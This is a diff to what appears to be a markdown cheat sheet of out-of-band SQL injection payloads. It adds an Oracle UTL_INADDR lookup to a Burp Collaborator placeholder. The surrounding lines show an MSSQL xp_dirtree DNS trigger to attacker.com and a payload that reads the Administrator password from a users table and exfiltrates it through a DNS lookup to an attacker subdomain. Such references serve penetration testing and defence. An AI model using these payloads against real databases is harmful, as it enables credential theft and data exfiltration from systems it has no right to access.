@@ -194,6 +194,7 @@ An application might carry out a SQL query asynchronously (another thread execut
 ```markdown
 # Triggering a DNS query
 '; exec master..xp_dirtree '//attacker.com/a'--
+' UNION SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
 
 # Exfiltrate data
 '; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.attacker.com/a"')--
